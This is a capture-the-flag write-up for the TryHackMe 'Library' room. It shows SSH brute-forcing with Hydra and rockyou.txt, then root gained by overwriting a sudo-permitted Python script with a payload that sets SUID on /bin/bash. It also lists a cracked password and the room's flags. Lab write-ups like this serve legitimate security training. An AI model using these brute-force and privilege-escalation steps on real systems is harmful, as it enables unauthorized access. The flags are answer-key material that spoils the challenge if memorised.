# 🛡️ TryHackMe – Library - Writeup

## 📌 Overview
**Room Name:** Library  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / SSH Brute Force / PrivEsc

Linux machine running a blog on Apache. `robots.txt` hints at the wordlist to use; usernames are visible in the page source; SSH brute-force gains entry. A writable `sudo`-able Python script is replaced to set SUID on `/bin/bash`.

Attack chain overview:

- Port scan → SSH (22) and Apache HTTP (80)
- `robots.txt` `User-agent: rockyou` hints at `rockyou.txt` for brute-forcing
- Usernames extracted from blog HTML source: `meliodas`, `root`, `www-data`
- Hydra SSH brute-force → `meliodas:iloveyou1`
- Systematic privesc enumeration (SUID, cron, `/etc/passwd`, kernel) — all dead ends
- `sudo` allows `/usr/bin/python* /home/meliodas/bak.py` → replace `bak.py` → SUID bash → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
22/tcp  open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http  Apache httpd 2.4.18 — "Welcome to Blog - Library Machine"
```

Nmap also flagged `http-robots.txt: 1 disallowed entry /`.

### 🌐 Web Enumeration

**robots.txt:**

```text
User-agent: rockyou
Disallow: /
```

The `User-agent` field names `rockyou` rather than a real crawler — an explicit hint to use `rockyou.txt` as the brute-force wordlist.

**HTML source of the main page:**

The blog post and its comments exposed three usernames:

- `meliodas` — post author
- `root` — commenter
- `www-data` — commenter

`meliodas` was the most likely SSH candidate as the human account.

---

## 🔓 2. Initial Access — SSH Brute Force

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
```

```text
[22][ssh] host: <TARGET_IP>   login: meliodas   password: iloveyou1
```

```bash
ssh meliodas@<TARGET_IP>
```

**Initial access as `meliodas` achieved.** ✅

---

## 🔍 3. Privilege Escalation Enumeration

Before using the `sudo` vector identified during initial enumeration, standard privesc paths were checked systematically:

```bash
find / -perm -u=s -type f 2>/dev/null
# → Only standard system binaries; nothing in GTFOBins applicable here

cat /etc/crontab && ls -la /etc/cron*
# → Default system cron jobs only

ls -la /etc/passwd
# → root-owned, read-only for meliodas

uname -a
# → Linux ubuntu 4.4.0-159-generic (Aug 2019) — patched, no public exploits
```

All standard vectors were dead ends. Returned to the `sudo` entry from `sudo -l`:

```bash
sudo -l
# → (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

```bash
cat /home/meliodas/bak.py
# → backup script: zips /var/www/html into /var/backups/website.zip
```

The file is root-owned but `meliodas` owns the home directory — meaning `bak.py` can be deleted and replaced.

---

## 👑 4. Privilege Escalation — bak.py Replacement

The `sudo` rule specifies the full absolute path `/home/meliodas/bak.py`. Attempting a relative path was rejected:

> **Why relative paths fail with sudo:** `sudo` matches commands against its policy using the exact path specified in `sudoers`. `sudo python bak.py` expands to `/usr/bin/python bak.py` (no absolute path for the script), which does not match the rule. The full path `/home/meliodas/bak.py` is required.

Replaced `bak.py` with a payload that sets the SUID bit on `/bin/bash`:

```bash
rm bak.py
echo 'import os; os.system("chmod +s /bin/bash")' > /home/meliodas/bak.py
sudo python /home/meliodas/bak.py
```

```bash
ls -la /bin/bash
# → -rwsr-sr-x 1 root root ... /bin/bash
```

```bash
bash -p
whoami
# root
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
6d488cbb3f111d135722c33cb635f4ec
```

### 👑 Root Flag

```
e8c8c6c256c35515d1d344ee0488c617
```

---

## 📚 Key Takeaways

- 🤖 **`robots.txt` `User-agent` fields can be hints, not crawler names:** A value of `rockyou` has no meaning to a web crawler — it's a CTF cue pointing directly at the wordlist. Non-standard `User-agent` values in `robots.txt` are always worth reading carefully.

- 👤 **Blog post authors and comment sections leak usernames:** CMS sites expose the account names of contributors in the HTML. Reading the page source for author and commenter metadata is a fast, low-noise recon step.

- 🔍 **Exhaust standard privesc paths before relying on sudo:** SUID, writable cron scripts, `/etc/passwd` permissions, and kernel version all take minutes to check. Ruling them out explicitly confirms the `sudo` vector is the intended path rather than the first thing tried.

- 📁 **File ownership of the parent directory determines replaceability:** `bak.py` was root-owned, but `meliodas` owned `/home/meliodas/`. Directory ownership controls the ability to create and delete files within it — owning a directory means any file inside it can be replaced regardless of the file's own owner.

- 📍 **`sudo` rules enforce exact absolute paths:** The sudoers entry specifies the full path. Passing a relative script path produces a "not allowed" error even when the binary matches. Always use the exact path from the `sudo -l` output.

---

## 🛠️ Tools Used

- `rustscan`
- `hydra`
- `ssh`
- `find` (SUID enumeration)
- `python` (payload execution)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
